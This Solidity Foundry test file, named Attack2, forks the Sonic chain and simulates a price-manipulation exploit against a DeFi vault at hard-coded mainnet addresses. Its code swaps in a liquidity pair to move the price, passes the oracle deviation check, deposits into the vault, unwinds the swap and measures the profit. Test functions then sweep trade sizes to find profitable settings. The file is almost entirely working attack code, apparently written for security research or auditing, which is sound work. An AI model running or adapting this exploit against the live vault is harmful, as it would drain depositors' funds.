// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
interface IERC20 { function balanceOf(address) external view returns(uint256); function transfer(address,uint256) external returns(bool); function approve(address,uint256) external returns(bool);}
interface IWNative { function deposit() external payable; }
interface IVault {
    function previewShares(uint256,uint256) external view returns(uint256,uint256,uint256);
    function previewAmounts(uint256) external view returns(uint256,uint256);
    function totalSupply() external view returns(uint256);
    function getStrategy() external view returns(address);
    function deposit(uint256,uint256,uint256) external returns(uint256,uint256,uint256);
}
interface IStrategy { function getBalances() external view returns(uint256,uint256); }
interface IOracleHelper { function getPrice() external view returns(uint256); function checkPriceInDeviation() external view returns(bool);}
interface ILBPair { function getActiveId() external view returns(uint24); function swap(bool,address) external returns(bytes32);}

contract Attack2 is Test {
    address constant VAULT=0x6bE5a84D4A92269eC0Eb228B6c4dAdecED4C7D54;
    address constant PAIR=0x9eDE606c7168bb09fF73EbdE7bFD6FcfaBDA9Bc3;
    address constant WETH=0x50c42dEAcD8Fc9773493ED674b675bE577f2634b;
    address constant WS=0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant OH=0x01c871DfFC36eDC4dDf86FB4a9Bc690B3613a80f;
    IVault v=IVault(VAULT); ILBPair p=ILBPair(PAIR); IStrategy s; address atk=address(0xA11CE);
    uint256 Ptrue;
    function setUp() public { vm.createSelectFork("sonic",78400000); s=IStrategy(v.getStrategy()); Ptrue=IOracleHelper(OH).getPrice(); }
    function valWs(uint256 w,uint256 y) internal view returns(uint256){ return ((Ptrue*w)>>128)+y; }
    function guardOk() internal view returns(bool){ try IOracleHelper(OH).checkPriceInDeviation() returns(bool){return true;} catch {return false;} }

    function attackUp(uint256 mws,uint256 dWeth) internal returns(int256 profitWs,bool ok){
        uint256 snap=vm.snapshotState();
        vm.deal(atk,mws); vm.startPrank(atk); IWNative(WS).deposit{value:mws}(); vm.stopPrank();
        deal(WETH,atk,dWeth);
        uint256 vb=valWs(IERC20(WETH).balanceOf(atk),IERC20(WS).balanceOf(atk));
        vm.startPrank(atk);
        uint256 wb=IERC20(WETH).balanceOf(atk);
        IERC20(WS).transfer(PAIR,mws); p.swap(false,atk);
        uint256 bought=IERC20(WETH).balanceOf(atk)-wb;
        if(!guardOk()){vm.stopPrank();vm.revertToState(snap);return(0,false);}
        IERC20(WETH).approve(VAULT,dWeth); (uint256 sh,,)=v.deposit(dWeth,0,0);
        IERC20(WETH).transfer(PAIR,bought); p.swap(true,atk);
        vm.stopPrank();
        (uint256 rx,uint256 ry)=v.previewAmounts(sh);
        uint256 va=valWs(IERC20(WETH).balanceOf(atk),IERC20(WS).balanceOf(atk))+valWs(rx,ry);
        profitWs=int256(va)-int256(vb); ok=true; vm.revertToState(snap);
    }
    // DOWN: manip by selling mweth WETH (push price down), deposit dWs wS, unwind buy back
    function attackDown(uint256 mweth,uint256 dWs) internal returns(int256 profitWs,bool ok){
        uint256 snap=vm.snapshotState();
        deal(WETH,atk,mweth);
        vm.deal(atk,dWs); vm.startPrank(atk); IWNative(WS).deposit{value:dWs}(); vm.stopPrank();
        uint256 vb=valWs(IERC20(WETH).balanceOf(atk),IERC20(WS).balanceOf(atk));
        vm.startPrank(atk);
        uint256 yb=IERC20(WS).balanceOf(atk);
        IERC20(WETH).transfer(PAIR,mweth); p.swap(true,atk);
        uint256 boughtWs=IERC20(WS).balanceOf(atk)-yb;
        if(!guardOk()){vm.stopPrank();vm.revertToState(snap);return(0,false);}
        IERC20(WS).approve(VAULT,dWs); (uint256 sh,,)=v.deposit(0,dWs,0);
        IERC20(WS).transfer(PAIR,boughtWs); p.swap(false,atk);
        vm.stopPrank();
        (uint256 rx,uint256 ry)=v.previewAmounts(sh);
        uint256 va=valWs(IERC20(WETH).balanceOf(atk),IERC20(WS).balanceOf(atk))+valWs(rx,ry);
        profitWs=int256(va)-int256(vb); ok=true; vm.revertToState(snap);
    }

    function testAsymptoteUp() public {
        uint256[] memory dep=new uint256[](6);
        dep[0]=200e18;dep[1]=1000e18;dep[2]=5000e18;dep[3]=20000e18;dep[4]=100000e18;dep[5]=500000e18;
        for(uint j=0;j<dep.length;j++){
            (int256 pr,bool ok)=attackUp(150_000e18,dep[j]);
            if(ok){ emit log_named_string("UP dWeth",vm.toString(dep[j]/1e18)); emit log_named_int("profit_wS",pr); }
        }
    }
    function testDown() public {
        uint256[] memory mw=new uint256[](5);
        mw[0]=1e18;mw[1]=2e18;mw[2]=3e18;mw[3]=3300000000000000000;mw[4]=5e18;
        uint256[] memory dep=new uint256[](3);
        dep[0]=100000e18;dep[1]=1000000e18;dep[2]=10000000e18;
        for(uint i=0;i<mw.length;i++)for(uint j=0;j<dep.length;j++){
            (int256 pr,bool ok)=attackDown(mw[i],dep[j]);
            if(ok){ emit log_named_string("DOWN mweth/dWs",string.concat(vm.toString(mw[i])," / ",vm.toString(dep[j]/1e18))); emit log_named_int("profit_wS",pr); }
        }
    }
}
